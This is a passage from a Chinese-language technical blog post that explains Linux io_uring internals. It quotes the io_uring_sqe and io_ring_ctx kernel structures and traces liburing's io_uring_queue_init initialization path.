IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment"> * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u8cmd[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_uring_sqe</code> , 用来表征一个IO任务的sqe, 通过在sqes 环形队列上插入此结构体, 实现内核任务的提交.  其中大部分参数都是提交给相应的任务处理函数的参数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">__u8opcode;<span class="comment">// 任务的类型, 用一系列枚举变量来表示</span></span><br><span class="line">__u8flags;<span class="comment">// 任务的一些标志位, 可以设置任务的一些特性</span></span><br><span class="line">__u16ioprio;<span class="comment">/* ioprio for the request */</span></span><br><span class="line">__s32fd;<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64off;<span class="comment">/* offset into file */</span></span><br><span class="line">__u64addr2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u32cmd_op;</span><br><span class="line">__u32__pad1;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__u64addr;<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">__u64splice_off_in;</span><br><span class="line">&#125;;</span><br><span class="line">__u32len;<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">__kernel_rwf_t</span>rw_flags;</span><br><span class="line">__u32fsync_flags;</span><br><span class="line">__u16poll_events;<span class="comment">/* compatibility */</span></span><br><span class="line">__u32poll32_events;<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">__u32sync_range_flags;</span><br><span class="line">__u32msg_flags;</span><br><span class="line">__u32timeout_flags;</span><br><span class="line">__u32accept_flags;</span><br><span class="line">__u32cancel_flags;</span><br><span class="line">__u32open_flags;</span><br><span class="line">__u32statx_flags;</span><br><span class="line">__u32fadvise_advice;</span><br><span class="line">__u32splice_flags;</span><br><span class="line">__u32rename_flags;</span><br><span class="line">__u32unlink_flags;</span><br><span class="line">__u32hardlink_flags;</span><br><span class="line">__u32xattr_flags;</span><br><span class="line">__u32msg_ring_flags;</span><br><span class="line">__u32uring_cmd_flags;</span><br><span class="line">&#125;;</span><br><span class="line">__u64user_data;<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line"><span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">__u16buf_index;</span><br><span class="line"><span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">__u16buf_group;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"><span class="comment">/* personality to use, if used */</span></span><br><span class="line">__u16personality;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">__s32splice_fd_in;</span><br><span class="line">__u32file_index;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16addr_len;</span><br><span class="line">__u16__pad3[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u64addr3;</span><br><span class="line">__u64__pad2[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment"> * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u8cmd[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_ring_ctx</code> 是kernel  io_uring运行的上下文，记录了io_uring 运行时需要保存的一些信息，这里就不一一分析每个成员了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> &#123;</span></span><br><span class="line"><span class="comment">/* const or read-mostly hot data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_next: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>restricted: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>off_timeout_used: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_active: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>has_evfd: <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* all CQEs should be posted only by the submitter task */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>task_complete: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>lockless_cq: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>syscall_iopoll: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>poll_activated: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>drain_disabled: <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>compat: <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">submitter_task</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span>*<span class="title">rings</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span><span class="title">refs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">task_work_notify_mode</span><span class="title">notify_method</span>;</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* submission data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">uring_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ring buffer of indices into array of io_uring_sqe, which is</span></span><br><span class="line"><span class="comment"> * mmapped by the application using the IORING_OFF_SQES offset.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This indirection could e.g. be used to assign fixed</span></span><br><span class="line"><span class="comment"> * io_uring_sqe entries to operations and only submit them to</span></span><br><span class="line"><span class="comment"> * the queue when needed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The kernel modifies neither the indices array nor the entries</span></span><br><span class="line"><span class="comment"> * array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u32*sq_array;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span>*<span class="title">sq_sqes</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cached_sq_head;</span><br><span class="line"><span class="type">unsigned</span>sq_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fixed resources fast path, should be accessed only under</span></span><br><span class="line"><span class="comment"> * uring_lock, and updated through io_uring_register(2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_node</span>*<span class="title">rsrc_node</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>cancel_seq;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_file_table</span><span class="title">file_table</span>;</span></span><br><span class="line"><span class="type">unsigned</span>nr_user_files;</span><br><span class="line"><span class="type">unsigned</span>nr_user_bufs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>**<span class="title">user_bufs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span><span class="title">submit_state</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span>*<span class="title">io_bl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xarray</span><span class="title">io_bl_xa</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span><span class="title">cancel_table_locked</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">apoll_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">netmsg_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;iopoll_list is protected by the ctx-&gt;uring_lock for</span></span><br><span class="line"><span class="comment"> * io_uring instances that don&#x27;t use IORING_SETUP_SQPOLL.</span></span><br><span class="line"><span class="comment"> * For SQPOLL, only the single threaded io_sq_thread() will</span></span><br><span class="line"><span class="comment"> * manipulate the list, hence no extra locking is needed there.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span><span class="title">iopoll_list</span>;</span></span><br><span class="line"><span class="type">bool</span>poll_multi_queue;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We cache a range of free CQEs we can use, once exhausted it</span></span><br><span class="line"><span class="comment"> * should go through a slower range setup, see __io_get_cqe()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>*<span class="title">cqe_cached</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>*<span class="title">cqe_sentinel</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span>cached_cq_tail;</span><br><span class="line"><span class="type">unsigned</span>cq_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ev_fd</span>__<span class="title">rcu</span>*<span class="title">io_ev_fd</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cq_extra;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * task_work and async notification delivery cacheline. Expected to</span></span><br><span class="line"><span class="comment"> * regularly bounce b/w CPUs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span><span class="title">work_llist</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>check_cq;</span><br><span class="line"><span class="type">atomic_t</span>cq_wait_nr;</span><br><span class="line"><span class="type">atomic_t</span>cq_timeouts;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">cq_wait</span>;</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* timeouts */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span>timeout_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">timeout_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">ltimeout_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cq_last_tm_flush;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span><span class="title">completion_cqes</span>[16];</span></span><br><span class="line"></span><br><span class="line"><span class="type">spinlock_t</span>completion_lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IRQ completion list, under -&gt;completion_lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span><span class="title">locked_free_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>locked_free_nr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_comp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">cq_overflow_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span><span class="title">cancel_table</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">sq_creds</span>;</span><span class="comment">/* cred used for __io_sq_thread() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span>*<span class="title">sq_data</span>;</span><span class="comment">/* if using sq thread polling */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">sqo_sq_wait</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">sqd_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>file_alloc_start;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>file_alloc_end;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xarray</span><span class="title">personalities</span>;</span></span><br><span class="line">u32pers_next;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Keep this last, we don&#x27;t need it for the fast path */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">poll_wq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_restriction</span><span class="title">restrictions</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* slow path rsrc auxilary data, used by update/register */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>*<span class="title">dummy_ubuf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>*<span class="title">file_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>*<span class="title">buf_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* protected by -&gt;uring_lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">rsrc_ref_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">rsrc_node_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">rsrc_quiesce_wq</span>;</span></span><br><span class="line"><span class="type">unsigned</span>rsrc_quiesce;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_pages</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_UNIX)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span>*<span class="title">ring_sock</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* hashed buffered write serialization */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_hash</span>*<span class="title">hash_map</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used for accounting purposes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span>*<span class="title">user</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span>*<span class="title">mm_account</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ctx exit and cancelation */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span><span class="title">fallback_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delayed_work</span><span class="title">fallback_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span><span class="title">exit_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">tctx_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span><span class="title">ref_comp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* io-wq management, e.g. thread count */</span></span><br><span class="line">u32iowq_limits[<span class="number">2</span>];</span><br><span class="line"><span class="type">bool</span>iowq_limits_set;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span><span class="title">poll_wq_task_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">defer_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span>sq_thread_idle;</span><br><span class="line"><span class="comment">/* protected by -&gt;completion_lock */</span></span><br><span class="line"><span class="type">unsigned</span>evfd_last_cq_tail;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If IORING_SETUP_NO_MMAP is used, then the below holds</span></span><br><span class="line"><span class="comment"> * the gup&#x27;ed pages for the two rings, and the sqes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>n_ring_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>n_sqe_pages;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>**<span class="title">ring_pages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>**<span class="title">sqe_pages</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="liburing-2">liburing</h2><p>liburing 提供的核心接口有如下函数:</p><ul><li><code>io_uring_queue_init</code>  io_uring的初始化结构，用来初始化一个 <code>io_uring</code> 结构体</li><li><code>io_uring_prep_xxx</code>      用来创建一个任务</li><li><code>io_uring_submit</code>          用来提交一个任务</li></ul><h3 id="io-uring-queue-init"><code>io_uring_queue_init</code></h3><p>参数:</p><ul><li>entries: sq队列大小</li><li>rings:     <code>io_uring</code> 结构体,  liburing提供给用户态的管理结构</li><li>flags:     传递给 <code>io_uring_setup</code> 的 <code>params</code>  中的 flag, 用来控制创建的io_uring的特性, 详情可以看  <a href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_set_up</a><br>返回值:</li><li>fd:           用来mmap的fd</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_init</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;p, <span class="number">0</span>, <span class="keyword">sizeof</span>(p));</span><br><span class="line">p.flags = flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> io_uring_queue_init_params(entries, ring, &amp;p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一系列调用链:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--&gt;io_uring_queue_init</span><br><span class="line">--&gt;io_uring_queue_init_params</span><br><span class="line">--&gt;io_uring_queue_init_try_nosqarr</span><br><span class="line">--&gt;__io_uring_queue_init_params</span><br></pre></td></tr></table></figure><p>最后到 <code>__io_uring_queue_init_params</code></p><p>其中 p 是要传递给 <code>io_uring_setup</code> 的params,  buf 的使用将在后面分析.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __io_uring_queue_init_params(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span><br><span class="line"> <span class="keyword">struct</span> io_uring_params *p, <span class="type">void</span> *buf,</span><br><span class="line"> <span class="type">size_t</span> buf_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd, ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> *sq_array;</span><br><span class="line"><span class="type">unsigned</span> sq_entries, index;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The kernel does this check already, but checking it here allows us</span></span><br><span class="line"><span class="comment"> * to avoid handling it below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY</span><br><span class="line">    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">// 如果设置了REGISTERED_FD_ONLY 就必须要设置 NO_MMAP</span></span><br></pre></td></tr></table></figure><p>对于设置了NO_MMAP的请求，通过 <code>io_uring_alloc_huge</code> 进行了预处理，这个函数我们将在之后[[#io_uring_alloc_huge]]进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123;</span><br><span class="line">ret = io_uring_alloc_huge(entries, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq,</span><br><span class="line">buf, buf_size);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">if</span> (buf)</span><br><span class="line">ring-&gt;int_flags |= INT_FLAG_APP_MEM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果设置了NO_MMAP，就要预先分配大内存</span></span><br></pre></td></tr></table></figure><p>接下来就是调用<code>io_uring_setup</code>  